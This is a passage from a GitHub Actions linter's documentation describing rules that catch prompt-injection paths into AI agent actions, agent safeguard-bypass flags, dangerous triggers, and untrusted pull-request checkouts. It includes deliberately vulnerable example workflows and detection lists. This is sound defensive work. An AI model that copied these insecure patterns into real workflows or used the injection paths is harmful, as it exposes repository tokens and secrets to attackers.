[Playground](https://jactionlint.jdx.dev/#eNqcks1q4zAQx+9+iiEsBJZVvAt70ikU+gTtrRQjy1NbraQxmhmHNuTdi+0klEIuvRjG+un/MYiyrQACs2LjKSXMMv8AkPcR2cKTL+gEu+eqGrGkwBwo84x4yoJZ2MKhBMGLynWuXqldQMcc+KxaNLOhbEFbzaImOkGW5YgFR14pAAPKs5TzMvvVfkD/Rir76f+ZADgEGex1Aij4YucP16PGWP86HqEPMmi7wwmz7JZ4u6ypxQKnUz2g677bZRkKjcFz7aPTDo2nDs2aYj/9u+ntYqQDdk2m3Cz1G2UsbGH7e/sFW0UbV3q2YMz51iNRZNjcOR7+3HdBNhUAa0quhA/82d56oj6iWfubyxaLZtNjCjkYH8N++nuzz1gojWLh4RIDZEDoAntdXsDnAGWMshM=)

**Which workflows are checked.** The rule looks at the steps that run a known agent action (the table of known actions lists them) in a workflow that outsiders can reach, that is, one with an `issues`, `issue_comment`, `pull_request_target`, `pull_request_review`, `pull_request_review_comment`, `discussion` or `discussion_comment` trigger. `pull_request` is not on the list: a workflow that a pull request from a fork starts has a read-only token and no secrets. `workflow_run` is not either, because it is as safe as the workflow it follows, which the rule cannot see. A `workflow_run` workflow is checked only for an open gate and for a checkout of the code that the upstream run built.

**What is reported.**

- **An open gate.** Claude Code Action, Codex and Droid run only for users with write access, but an input switches that off: `allowed_non_write_users: '*'`, `allowed_bots: '*'` or `allow-users: '*'`. A list of named users is accepted.
- **No check of the user.** The agent actions that do not check who started them (Gemini CLI, AI inference, OpenHands, Oz, PR-Agent and others) run for everybody who can cause the trigger. The rule accepts a job that is restricted by an `if:` on `author_association`, the actor, the sender or a label (also in a job it `needs`), by an `environment:` (reviewers can be required; an environment without them does not count with `--online`, see [environments without reviewers](#check-untrusted-checkout-environment)), or by an earlier step that checks the permission of the actor. This is a heuristic: it cannot tell a correct condition from a condition that mentions the actor.
- **Settings that turn the safeguards off.** `--dangerously-skip-permissions`, `--permission-mode bypassPermissions` and allowed tools that give a shell (`Bash`, `Bash(*)`, `Bash(python:*)`, `Bash(python -c:*)`, `Bash(curl:*)`) or any URL (`WebFetch`) in `claude_args` and `settings` of Claude Code; `safety-strategy: unsafe` (except on Windows, where Codex needs it), `sandbox: danger-full-access` and the matching `codex-args` of Codex; `tools.allowed` with `run_shell_command` of the Gemini CLI; `shell(bash:*)` in `copilot-allow-tools` of AI inference; `--skip-permissions-unsafe` of Droid. Exact commands like `Bash(git diff:*)` are not reported. With the option `any-trigger` these are reported in every workflow.
- **Code of a pull request in the workspace.** On `pull_request_target`, `issue_comment`, `workflow_run` and the review triggers, an agent that runs after a checkout of the pull request reads `CLAUDE.md`, `AGENTS.md`, `.claude/settings.json`, `.mcp.json` and the like from it, so the pull request configures the agent (hooks and servers run commands with the secrets of the job). Check out the base branch in the workspace and the pull request in a subdirectory with `path:`, as [the documentation of Claude Code Action](https://github.com/anthropics/claude-code-action/blob/main/docs/security.md) says.
- **Untrusted data read from the environment.** A prompt that tells the agent to read `$TITLE` when `TITLE` is set from `github.event.issue.title`. (`${{ env.TITLE }}` in a prompt is reported by `template-injection`.)
- **A secret in the environment of the agent**, when outsiders can reach the agent by one of the reports in this list: the shell of the agent can print its environment. `GITHUB_TOKEN` is not reported.

**What is not reported.** The first two reports are skipped when a steered agent can do little: for a job whose `permissions:` are set explicitly and grant no write access except to `issues`, `pull-requests` and `discussions` (the setup the actions document for triage and labeling), and for an agent that is limited to a list of exact tools (`--allowedTools "Bash(gh issue edit:*)"` of Claude Code, `tools.core` of the Gemini CLI) or to a read-only sandbox (Codex). These are the shape of the architecture the vendors advise: an agent with a read-only token and a sandbox, and a second job that acts on its validated output. The agent still holds its API key, so keep every other secret away from it. The message names the scopes that the token can write when the workflow or the job sets `permissions:`.

**Known actions.** The rule knows these actions and inputs. An action that is not in the table is not checked.

| Action | Prompt inputs | Arguments and settings | Checks the user itself |
| --- | --- | --- | --- |
| `anthropics/claude-code-action` | `prompt` (v0: `direct_prompt`, `override_prompt`, `custom_instructions`) | `claude_args`, `settings` (v0: `allowed_tools`, `disallowed_tools`, `mcp_config`, `claude_env`) | yes |
| `anthropics/claude-code-base-action` | `prompt` (v0: `direct_prompt`, `custom_instructions`) | `claude_args`, `settings` (v0: `allowed_tools`, `disallowed_tools`, `mcp_config`, `claude_env`) | no |
| `anthropics/claude-code-security-review` | | | no |
| `google-github-actions/run-gemini-cli` | `prompt` | `settings`, `extensions` | no |
| `google-gemini/gemini-cli-action` | `prompt` | `settings_json` | no |
| `openai/codex-action` | `prompt` | `codex-args` | yes |
| `actions/ai-inference` | `prompt`, `system-prompt` | `copilot-allow-tools` | no |
| `factory-ai/droid-action` | | `droid_args`, `settings` | yes |
| `sst/opencode/github`, `anomalyco/opencode/github` | `prompt` | | yes |
| `openhands/openhands-github-action` | `prompt` | | no |
| `warpdotdev/oz-agent-action` | `prompt` | `mcp` | no |
| `qodo-ai/pr-agent`, `codium-ai/pr-agent` (the former name) | `artifact_instructions` | | no |

**What the rule cannot know**, so a clean result is not a proof of safety:

- What the prompt tells the agent to read. A prompt that says "triage the newest issue" and gives the agent `gh issue view` exposes it to the text of the issue without any `${{ }}`. Limit the tools and the token.
- Files of the repository that configure the agent (`.claude/settings.json`, `.gemini/settings.json`, `.mcp.json`). Only the inputs of the workflow are read, and an input that is an expression is skipped.
- A gate in another workflow. A workflow with only `workflow_call` has no trigger of its own, so it is not reported.
- Whether the agent action of a version really has an input: the rule reads names, not versions.

**Fix.** Allow the exact commands the agent needs (`--allowedTools "Bash(gh issue view:*)"`), give the job `permissions:` with the least access (`permissions: {}` plus the one scope), keep the key of the agent the only secret in the job, and gate the job with an `if:` on `github.event.comment.author_association`.

**Configure.** To turn the rule off for a step, ignore the line (`# jactionlint ignore=agentic-actions`, see [ignore findings](./ignore.md#ignore-some-errors)) or set `rules: {agentic-actions: off}` in the [configuration file](./config.md#rules). `rules: {agentic-actions: {any-trigger: true}}` also reports the unsafe settings in workflows that outsiders cannot trigger.

**Related.** [Container options, Docker steps and AI agent inputs](#check-template-injection-sinks) describes the prompt, the arguments and the settings of these actions as places where `template-injection` reports an expression.

<a id="check-dangerous-triggers"></a>
## Dangerous triggers

The rule `dangerous-triggers` (default profile) reports a workflow that runs on `pull_request_target`, `workflow_run` or `issue_comment`: triggers that run with the secrets and the token of the repository (in the context of the default branch) while a fork, or any commenter, controls part of the event. With the option `pedantic`, it also reports a workflow of that kind that cannot write and reads no secret.

Example input:

```yaml
on:
  pull_request_target:
    types: [opened]
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
```

Example config:

```yaml
rules:
  dangerous-triggers: warn
```

Output:

```
test.yaml:2:3: warning: trigger "pull_request_target" is dangerous: it runs in the context of the base repository with the default token of the repository (it can write unless the settings of the repository restrict it) and no secrets, even when the pull request comes from a fork. use "pull_request" unless write access is required, and never check out or run code of the pull request [dangerous-triggers]
  |
2 |   pull_request_target:
  |   ^~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule, at the level `warn` that the `rules` section of the example config, which is an entry of the [configuration file](./config.md#rules) sets (the default level of the rule is `error`). `--select dangerous-triggers` with that configuration gives the same findings on a file with the same content.

Making these triggers safe is hard: it is not enough to avoid checking out the pull request, because arguments, environment variables and files that come from the event can still lead to code execution. See [Keeping your GitHub Actions and workflows secure: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/).

**What the message says.** The message says what the workflow can do with the token and the secrets, so that you see what is at stake:

- the scopes that the token of a job can write (`permissions:` of the job, else of the workflow; `write-all` is every scope). A job that sets no permissions, in a workflow that sets none, gets the default of the repository, which can write unless the settings of the repository restrict it. When some jobs set permissions and others do not, the message names both tokens. Permissions (or a scope) written as an expression are not known, so the token may write;
- the names of the secrets that an expression reads (not `GITHUB_TOKEN`), or that the workflow passes on without naming them (`secrets: inherit`, `toJSON(secrets)`, `secrets[matrix.name]`).

**Pedantic option.** A workflow that cannot write (`permissions: {}`, `read-all` or only `read` scopes in every job) and reads no secret has little to lose: an attacker gets the cache, the artifacts and the compute of the runs, not the repository or its secrets. The option `pedantic` (true under the `pedantic` profile) reports it, with a message that says so:

```yaml
rules:
  dangerous-triggers:
    pedantic: true
```

Since a workflow like that is not the pwn request which the trigger is known for, `untrusted-checkout`, `untrusted-artifact` and `template-injection` are the rules which report what it does with the event.

**Fix.** Prefer `pull_request` unless the workflow really needs write access (to leave a comment, for example), `workflow_call` instead of `workflow_run`, and a label added by a maintainer instead of a comment as the trigger. A workflow whose steps are only `actions/labeler` is accepted for `pull_request_target`, since it never runs code from the pull request.

**What GitHub does by default.** GitHub's [workflow execution protections](https://github.blog/changelog/2026-09-17-workflow-execution-protections-in-github-actions-generally-available) add a default rule that disables `pull_request_target` in public repositories that have no applicable Actions event policy. The rule does not apply to private or internal repositories, and an event policy can allow the trigger (a policy can name a workflow file). A workflow that an event policy allows is as dangerous as this section describes. The rule `dangerous-triggers` does not know the event policies of your repository, so it reports the trigger either way.

Another platform default reduces the risk without removing it: a run of an untrusted trigger (`pull_request_target`, `issue_comment`) gets a [read-only Actions cache](https://github.blog/changelog/2026-06-26-read-only-actions-cache-for-untrusted-triggers), which blocks writing to the cache.

**Configure.** The rule otherwise only looks at the trigger, so a workflow that uses one of them safely is reported as well. Ignore it with `# jactionlint ignore=dangerous-triggers` on the line before the trigger or at the end of the line, and say why in a comment: see [ignore findings](./ignore.md#ignore-some-errors) and [zizmor ignore comments](./ignore.md#zizmor-ignore-comments). For the differences from zizmor, see [zizmor parity](./zizmor-parity.md).

**Related.** [Untrusted code in privileged workflows](#check-untrusted-checkout), [untrusted artifacts in workflow_run workflows](#check-untrusted-artifact) and [comment triggers without a check of the user](#check-comment-trigger-authorization) report what a workflow of these triggers does with the event.

<a id="check-comment-trigger-authorization"></a>
## Comment triggers without a check of the user (pedantic)

The rule `comment-trigger-authorization` reports a job of a workflow that a comment starts (`issue_comment`, `pull_request_review_comment` or `discussion_comment`) when the `if:` of the job, or of one of its steps, reads `github.event.comment.body` and nothing checks who the commenter is. It is in the `pedantic` profile, at the level `warn`.

Example input:

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  deploy:
    runs-on: ubuntu-latest
    if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

Example config:

```yaml
rules:
  comment-trigger-authorization: warn
```

Output:

```
test.yaml:7:9: warning: this condition starts the job from the text of a comment (the event is "issue_comment"), and nothing checks who wrote it, so anyone who can comment can run the job with the token and the secrets of the repository. check github.event.comment.author_association (OWNER, MEMBER or COLLABORATOR), ask for the permission of github.actor in an earlier step or job, or run the job in an environment with required reviewers [comment-trigger-authorization]
  |
7 |     if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')
  |         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

A command bot starts a job from a comment (`/deploy`, `/test`, `@bot run`). The condition looks like a restriction, but it only reads what the commenter chose to write. On a public repository everybody on GitHub can comment, and the job runs in the base repository with the default token and the secrets.

**Fix.** Check the commenter before the job does any work. Compare `github.event.comment.author_association` with `OWNER`, `MEMBER` or `COLLABORATOR`, ask for the permission of `github.actor` in an earlier step or job, or run the job in an environment with required reviewers. There is no automatic fix.

**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=comment-trigger-authorization` (which also runs a rule that the profile does not enable), or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.

**What is reported.** The rule is [`dangerous-triggers`](#check-dangerous-triggers) with a finer eye: that rule reports the trigger of every workflow, this one reports the jobs that anybody can start. The check of the user is the same as that of [`agentic-actions`](#check-agentic-actions).

**What counts as a check of the user.** The rule accepts a job that has one of these:

- a condition on the association or the user (`github.event.comment.author_association`, `github.actor`, `github.event.comment.user.login`, ...);
- an `environment:` (which can require reviewers), or a condition on the labels of the issue or the pull request, which only people with triage access set;
- a step of the job that asks for the permission of the commenter: an action whose name has `permission` or `membership`, a `run:` that looks at `collaborators/` or `/permission`, an `actions/github-script` with a script that does, and the command actions `peter-evans/slash-command-dispatch`, `xt0rted/slash-command-action`, `github/command` and `github/branch-deploy` (they check the permission `write` by default). Each has its own input for the level: `permission` (dispatch), `permission-level` (slash-command-action) and the list `permissions` (command and branch-deploy). A level that every commenter has (`none` or `read`, also inside the list) is no check;
- a job that the job `needs` and that has one of these, or a condition that reads `needs` or `steps` (an earlier job or step decided);
- an AI agent action that checks the write access of the user itself (`anthropics/claude-code-action` unless `allowed_non_write_users` is `*`).

A step that checks, or an agent that does, protects the steps after it and itself, not the steps before it. A check after the work does not stop the work from running with the token and the secrets (a checkout before the check does not count as work). An agent that another comment starts (`@claude` in a `/deploy` job) does not run for this comment, so it protects nothing.

**What is not reported.** A job that calls a reusable workflow is not looked into, because the callee may check the user.

**Why the rule is pedantic.** It is a heuristic. It cannot tell a check that is correct from a mention of the actor, and an action or script of the repository that checks the commenter in a way that is not recognized (a custom action, a script file) is reported. Whether the job is harmful depends on what it does with the token and the secrets, and the rule does not judge that, so a job that only adds a reaction is reported as well.

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-untrusted-checkout"></a>
## Untrusted code in privileged workflows

The rule `untrusted-checkout` reports a `pull_request_target`, `workflow_run` or `issue_comment` workflow that checks out the code of a pull request and then runs it. It also reports a gate that holds at one moment (an environment, a label, the comment of a maintainer) in front of a branch that the author can still push to, a label that survives a push, and a step that turns off the protection of `actions/checkout` against the code of fork pull requests. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

Output:

```
test.yaml:8:16: this step checks out code from a pull request (github.event.pull_request.head.sha) in a "pull_request_target" workflow and "npm" runs it afterwards. the workflow has a write token and secrets, so whoever controls that code can use them. run untrusted code in a "pull_request" workflow without secrets, or check out the base branch and only read the pull request as data. the pinned actions/checkout (v4.2.2) predates the protection that refuses the code of a fork pull request here, upgrade to v4.4.0 or later [untrusted-checkout]
  |
8 |           ref: ${{ github.event.pull_request.head.sha }}
  |                ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNpMj8FOwzAMhu97il8C7dawtFtLc+JNpiT1lkJJS2yPw7R3Rx1o4mRb/yfr/+bssOg0HQt9KbEcxZczyeZ9Duw2gBDLOoGimasV16BZtJr8mt0jFlr4lwIqKBM7+CjjnPklJoofs8qbtWHobL+zIdAh2LbZRSLfNUPdHfquafex96f2tcETLntTm/rvIfA9SnKPCyh0cni+XnEeJWkwdKEs5r+GSeQHw8njdnv0Kpod8vKJOGK7vW+rws8AsOBOKw==)

These events run in the context of the base repository, with a token that can write and with the secrets, while the code is what the author of the pull request wrote. A build script, a test, a `package.json` hook or a local action is enough to take over the token.

**Fix.** Run untrusted code in a `pull_request` workflow, which has no secrets for pull requests from forks. If a privileged workflow has to look at the pull request, check out the base branch and read the pull request as data. When a gate lets the job start, check out the commit that was reviewed (`github.event.pull_request.head.sha`) instead of the branch. There is no automatic fix.

**Configure.** Two rule options widen the check. Both are on under the `pedantic` profile; set one for this rule alone under `rules` in the [configuration file](config.md#rules), for example `rules: {untrusted-checkout: {level: error, any-checkout: true}}`.

| Option | Effect |
| --- | --- |
| `pedantic` | Also reports a checkout that `actions/checkout` refuses for a fork, and a dispatch with the number of a pull request and no commit. |
| `any-checkout` | Also reports a checkout of the code of a pull request that no later step visibly runs. |

#### The checkout protection of actions/checkout

Since v7, and in the floating tags of every older major version but v1, `actions/checkout` refuses to check out the code of a pull request from a fork in a `pull_request_target` workflow, and in a `workflow_run` workflow that a pull request event started ([announcement](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/)). It refuses a `repository` that is the fork, a `ref` of `refs/pull/N/head` or `refs/pull/N/merge`, and a `ref` that is the head or merge commit of the pull request. The input `allow-unsafe-pr-checkout: true` turns the protection off. The rule takes it into account:

- **Not reported:** a checkout that the protection refuses. The step fails for a fork, and a pull request from a branch of the repository is written by someone with write access. The protection is in the floating tags (`@v4`, `@v6`, `@v7`), in a release that is the first one of its line or a later one (`v2.8.0`, `v3.7.0`, `v4.4.0`, `v5.1.0`, `v6.1.0`) and in a commit pinned with a version comment that names such a release (`# v4.4.0`, not `# v4`). The comment is not verified (`ref-version-mismatch` does that online), so a commit is only as guarded as its comment is true. With the option `pedantic` these checkouts are reported too, and the message says that only a pull request from a branch of the repository gets through.
- **Reported, with the advice to upgrade:** a release older than the first one of its line, a commit pinned with a comment that names such an older release, `v1`, and a commit without a version comment. The message says to upgrade when the version is known.
- **Reported as a finding of its own:** `allow-unsafe-pr-checkout: true`, or an expression, on that line, when the workflow has an event that the protection covers and the step has a `ref` or `repository` that is an expression or names `refs/pull/`. Nothing stops the step from checking out the code of the fork then. It is reported whether or not a later step runs the code.
- **Reported because the protection does not cover it:** `git` and `gh pr checkout` in a `run:` step, a branch name (`github.event.pull_request.head.ref`, `github.head_ref`) as the only input, a `refs/pull/N/head` whose number does not come from the pull request of the event (`inputs.number`), and a workflow that also has the event `issue_comment`, `issues` or `workflow_call`. So is a `workflow_run` workflow, unless every workflow in `workflows:` is in the repository and only runs for `pull_request*` events.

#### Workflows that a comment starts

A workflow that a comment starts (`issue_comment`, the "/test" bots) carries no head in the event, so the pull request has to come from somewhere. The rule recognizes:

- `gh pr checkout ${{ github.event.issue.number }}`, also with the `html_url` of the issue or of its `pull_request`, directly, through `env:` of the step, the job or the workflow, or a variable of the script;
- `refs/pull/<number>/head` or `/merge` with that number, in `actions/checkout`, `git fetch` and `git checkout`;
- the head that an action looks up (`steps.<id>.outputs.head_sha`, `head_ref`, ... of `xt0rted/pull-request-comment-branch`, `alessbell/pull-request-comment-branch`, `eficode/resolve-pr-refs`, `potiuk/get-workflow-origin` and `github/branch-deploy`).

It does not report `gh pr checkout` of anything else, a branch named after the number (`git checkout -b fix-${{ github.event.issue.number }}`), a revision from a step output of another action, and `github.head_ref` or `github.event.pull_request.*` (both are empty in a comment run). The `issues` event is not handled: its payload never names a pull request, and the text of an issue that does is an injection (see [`template-injection`](#untrusted-inputs)).

#### Gates in front of a checkout

A gate in front of the job or the step decides whether a checkout is reported. A comment run is safe when the person who commented, or the pull request author, is trusted. The rule accepts:

- a job or step `if:` on `github.event.comment.author_association` (or `github.event.issue.author_association`, or the association of the pull request) that names no association of someone without access. `NONE`, `CONTRIBUTOR`, `FIRST_TIMER`, `FIRST_TIME_CONTRIBUTOR` and `MANNEQUIN` are not trusted, so `!= 'NONE'` and a list that has `CONTRIBUTOR` are not gates. The same holds for the association of the author of a pull request in a `pull_request_target` workflow. A condition on `github.actor`, `github.event.comment.user` or `github.event.sender` is a guard;
- an earlier step of the job (one that always runs and does not use `continue-on-error`) of an action that fails the job for a user who may not write:
  - `sushichop/action-repository-permission` (`required-permission` of `write` or `admin`, which is the default, without `relax`);
  - `prince-chrismc/check-actor-permissions-action` and `lannonbr/repo-permission-check-action` (`permission: write` or `admin`);
  - `xt0rted/slash-command-action` (`permission-level` of `write`, the default, or `admin`);
  - `TheModdingInquisition/actions-team-membership` (`exit` is not `false`);
  - `actions-cool/check-user-permission` (`require` of `write` or `admin` and `error-if-missing: true`, without `username`; any other use only sets an output, so it is no gate, unless a condition on `steps` reads that output, which is a guard of its own);
  - `actions/github-script` that asks for the permission or the membership of the user (`getCollaboratorPermissionLevel`, `getMembershipForUserInOrg`, ...) and throws or calls `core.setFailed`.
- an `environment:`, and a job that this one needs (at any depth) and that has a guard in its `if:`, an `environment:` or a gate step: when that job is skipped or fails, so does this job, unless its own `if:` calls `always()`, `cancelled()` or `failure()`.

The gates fall in classes, and the class decides whether a checkout is reported:

| Gate | `pull_request_target`, `workflow_run` | `issue_comment`, `workflow_dispatch` (option `pedantic`) |
| --- | --- | --- |
| nothing | reported | reported |
| `environment:` with reviewers | one moment | one moment |
| permission check step, `github.actor`, the association of the commenter | holds, nothing is reported | one moment |
| `author_association` of the pull request (or of the issue) | holds | holds (comment) |
| `labels.*.name` of the pull request | lasts | |
| `github.event.label.name` (the `labeled` event, or `github.event.action == 'labeled'`) | one moment | |

A gate that **holds** checks who wrote the code, and stops the job whatever is pushed later. A gate that holds at **one moment** lets the job start, and the author can push to the branch afterwards: the checkout is reported when the ref can change (a branch, `refs/pull/N/head`, `gh pr checkout`, or any alternative of an expression that is one: `head.sha || github.head_ref`), not for a commit. A label that **lasts** is reported whatever the ref is when the workflow runs again for each push, unless the job takes the label away or the label is tied to the event. For a comment or a dispatch, who commented or dispatched is not who wrote the code, so a check of that user is a gate of one moment. The same classes apply to the steps of a composite action that a step calls, and to the gates of the calls of a reusable workflow, of which only the ones that every call has count. A gate that reads a context that the event does not have (the labels of a pull request in a comment) is not judged.

#### Time of check to time of use

A gate that lets a job start is only as good as the code that runs after it. An `environment:` whose reviewers approve, a label that a maintainer adds and a comment of a maintainer hold at one moment. If the job then checks out a branch (`github.event.pull_request.head.ref`, `github.head_ref`, `workflow_run.head_branch`, `head_ref` of the actions that look up a pull request, `refs/pull/N/head` or `refs/pull/N/merge`, `gh pr checkout`), the author of the pull request pushes after the review and the job runs what is there then, not what was reviewed ([ActionsTOCTOU](https://github.com/AdnaneKhan/ActionsTOCTOU) describes the attack). The rule reports it as another message of the same rule:

- **A gate that holds at one moment, and a ref that can change.** The gates that count are an `environment:`, a label condition (`github.event.label.name`, or `github.event.pull_request.labels`), and, in a workflow that only a comment starts, a check of the commenter (`author_association`, `github.actor`, `github.event.comment.user`, a permission check). The author of the pull request is not the commenter. A commit (`head.sha`, `merge_commit_sha`, `head_sha` of a step) is never reported for these gates: the reviewer saw that commit. A gate that checks the author, such as `author_association` of the pull request, the repository of the head, `github.actor` or a permission check in a `pull_request_target` workflow, still holds after a push, and so do conditions on `needs` and `steps`, which are not judged. A step that reads the commit after the checkout (`git rev-parse HEAD`, `git log -1`), compares it with something named sha, revision, commit, expected or verified and stops the job is taken for a check that it is the commit that was reviewed.
- **A label that lasts.** `if: contains(github.event.pull_request.labels.*.name, 'safe to test')` in a `pull_request_target` workflow that also runs for `opened`, `synchronize` or `reopened` (the default types): the label stays after the review, so each later push runs with it although nobody has looked at it, whatever the ref is, also a commit. It is not reported when the job takes the label away (`gh pr edit --remove-label`, `removeLabel`), or when the condition is tied to the event (`github.event.action == 'labeled'`, `github.event.label.name`).
- **A dispatch with the number of a pull request** (with the option `pedantic`): `workflow_dispatch` with an input that holds the number of a pull request (`pr`, `pr_number`, `pull`, ...) and no required input for a commit (`sha`, `commit`, `rev` in its name), that checks out `refs/pull/<input>/head` or runs `gh pr checkout <input>`. A maintainer dispatches it after reading the pull request, and a push in between runs unreviewed code. Add a required `sha` input and check it out.

The gates in front of the call of a reusable workflow or composite action are judged the same way, for the code of the callee, when every call that reaches it has them. An `environment:` and a label that lasts together are judged as an environment: its reviewers approve each run, the one of a new push too, so only a branch is reported.

#### Reusable workflows and composite actions that receive the head

Reusable workflows and composite actions run for the events of the workflows that call them, and the head of the pull request is often passed down as an input: the caller (`pull_request_target`) has `with: ref: ${{ github.event.pull_request.head.sha }}` and the callee has `actions/checkout` with `ref: ${{ inputs.ref }}` and then `make`. The rule judges a local reusable workflow (`uses: ./.github/workflows/x.yml`) or a local composite action for each call in a workflow of the project:

- A call counts when its workflow has a privileged event and the job and the step of the call are not guarded (an `environment:`, a guard condition, a permission gate before the step, a needed job that is guarded, or a condition on `github.event_name` that is false for the event). If the caller is itself a reusable workflow, the calls of it count too, up to three levels. The callee is then judged for those events, also for the head that it names itself (`github.event.pull_request.head.sha` in a reusable workflow that a `pull_request_target` workflow calls).
- An input is untrusted when a counting call gives it a value that names the head of a pull request (a context, or `refs/pull/...`) or reads an input of its own caller that is. The finding is at the checkout of the callee and says which call does it (`inputs.ref, given github.event.pull_request.head.sha by .github/workflows/pr.yaml`).
- A composite action that only checks out the head, with the steps that run it in the caller, is a checkout of the step that calls the action: the finding is at that `uses:` and the later steps of the caller run the code. The values of the call replace the inputs of the action (its defaults for the inputs the call leaves out); a step of the action that is guarded is not followed.
- The protection of `actions/checkout` is judged for the events that reach the callee, and a `workflow_call` workflow is only covered when all its callers are in the project.

What is not known stays out: a reusable workflow or action that no workflow of the project calls (it is published for other repositories), a call through a composite action that calls another one, a value from a step output, a matrix or a `needs` output, a `uses:` with an expression, and a call made by a composite action.

#### Checkouts that nothing runs

The rule needs a later step that runs the code, which keeps it quiet for the workflows that only read the pull request (`git diff`). The option `any-checkout` (on under the `pedantic` profile) reports the checkout of the code of a pull request in a `pull_request_target` or `workflow_run` workflow when no later step visibly runs it and no gate is in front of it. It catches code that the rule does not recognize as running code.

#### How untrusted-checkout finds the step that runs the code

A step is reported at its checkout when it puts untrusted code in the workspace and a later step in the same job runs it. The checkout can be:

- `actions/checkout` with a `ref` or `repository` that names the head of a pull request or of the triggering run (`github.event.pull_request.head.*`, `github.head_ref`, `github.event.pull_request.merge_commit_sha`, `github.event.workflow_run.head_sha`, `head_branch`, `head_repository`, ...) or `refs/pull/...`. In a `git` command the short form `pull/<number>/head` (or `merge`) counts as well, because git looks a name up in `refs/` too: `git fetch origin pull/${{ github.event.number }}/head:pr` then `git checkout pr`. A name inside a remote (`origin/pull/1/head`) is not it.
- `gh pr checkout`, and `git checkout`, `switch`, `merge`, `pull`, `clone` ... with such a reference in the arguments or in an environment variable they use. A `git fetch` of the head only downloads the objects: it counts when a later command of the same script (`git checkout FETCH_HEAD`, `git merge`, `git reset --hard`, ...) puts them in the working tree.
- A head that reaches those commands through a shell variable: `REF=$PR_REF` (or `REF="${{ github.event.pull_request.head.sha }}"`, a `for` loop over it, or a chain of assignments) and then `git fetch origin "$REF"`.
  - A variable is followed in execution order. An unconditional assignment replaces what the variable held, also what it inherited from the `env:` of the workflow, the job or the step, so assigning a clean value ends the taint. An assignment in a branch, loop, function or pipeline can only add.
  - A variable that an earlier step wrote to `$GITHUB_ENV` with an untrusted value is followed into the later steps of the job (`echo "REF=<head>" >> "$GITHUB_ENV"`, `printf 'REF=%s\n' ...`, a here document with `REF=<head>` or `REF<<EOF`). A later write of another value to the same variable, or an `env:` entry of a step that sets it, replaces it. `echo` writes one entry, the one of its first word.
  - A value that cannot be resolved (a command substitution, a `printf` format that is not understood) keeps the earlier value instead of replacing it.
- A `git fetch` of the head in an earlier step also counts when a later `run:` step starts a script file of the project (`./scripts/x.sh`, `bash scripts/x.sh`, `sh ./x.sh`) and that file, read from the repository being linted, has a command that changes the working tree and names `FETCH_HEAD` or a destination of the refspec literally (`git checkout FETCH_HEAD`).
- A script file that does the checkout itself counts at the step that starts it. The file is read, and the revision that reaches it is followed through the positional parameters it is given (`./scripts/co.sh "${{ github.event.pull_request.head.sha }}"` with `git checkout "$1"` inside), the variables it inherits (the `env:` of the step and the variables that the caller exported; the assignments in front of the call apply last) and its own assignments. The unexported variables and the positional parameters of the caller do not reach it. A script that uses `gh pr checkout` is one too, and so is a script that fetches the head and checks it out. Scripts that the script starts are followed three levels deep. The file is looked up from the directory the script is in, which follows `cd` with a literal relative directory. The step is reported at once when the script runs code after the checkout (`npm ci`; what ran before it does not count), otherwise when a later command or step does.
  - The rule does not guess. A script that is missing, too large, outside the repository, whose path is computed, or that is started after a `cd` that is conditional, dynamic or absolute (or `pushd`) is not followed.
  - Neither is a revision that comes out of a command (`REF=$(cmd)`, except that the words of the substitution are looked at), `read`, `eval`, an array, `declare -x`, a step output, or a here document written to `$GITHUB_ENV` with anything but `NAME=value` and `NAME<<DELIM` lines. The same holds for a revision that a step passes to a command other than `git`.

"Runs it" is a later step that has:

- a `run:` command that can execute workspace code (a script, `npm`, `cargo`, `make`, an interpreter, ...);
- a local action (`uses: ./...`);
- an action that runs the workspace (see the next heading).

Commands that only read or move files (`cat`, `git diff`, `grep`, `jq`, `tar`, `gh`, ...) do not count, except when an option makes them run a file of the workspace (a relative path or one inside `$GITHUB_WORKSPACE`, not `/tmp/x` or `$RUNNER_TEMP/x`): `sed -f script.sed`, `awk -f prog.awk`, `tar -xPf a.tar` (absolute names) and `unzip -: a.zip` (`../` in names). Shell keywords and builtins (`break`, `continue`, `compgen`, ...), programs that only print or convert data (`xxd`, `base64`, `seq`, ...) and the system package managers (`apt-get install -y valgrind`) do not count either, unless they are given a path or a package file. A checkout with `path:` only counts when a later step works in that directory (`working-directory`, `cd`, or an argument inside it). `python3 base/check.py --root pr-head` runs a script from the base checkout and only reads `pr-head`, so it does not count either.

#### Actions that run the workspace

An action counts as running the workspace when it runs a tool on the files of the repository:

- A linter with the configuration and the plugins of the repository: `oxsecurity/megalinter`, `super-linter/super-linter`, `trunk-io/trunk-action`, `bridgecrewio/checkov-action`, `sonarsource/sonarcloud-github-action`, `sonarsource/sonarqube-scan-action`, `errata-ai/vale-action`, `reviewdog/action-eslint`, `-rubocop`, `-tflint`, `-flake8`, `-stylelint`, `-golangci-lint`, `-mypy`, `pre-commit/action`, and the other eslint, rubocop, mypy, stylelint, phpstan and pre-commit actions of the same kind.
- A build or an installer: `dflook/terraform-plan`, `-apply`, `dflook/tofu-plan`, `-apply`, `JS-DevTools/npm-publish`, `pypa/cibuildwheel`, `PyO3/maturin-action`, `hynek/build-and-inspect-python-package`, `cypress-io/github-action`, `actions-rs/cargo`, `github/codeql-action/autobuild` and `analyze`, and the Maven, mkdocs and pip actions.
- An action that runs it only for an input, which the rule checks:
  - `ruby/setup-ruby` with `bundler-cache: true`;
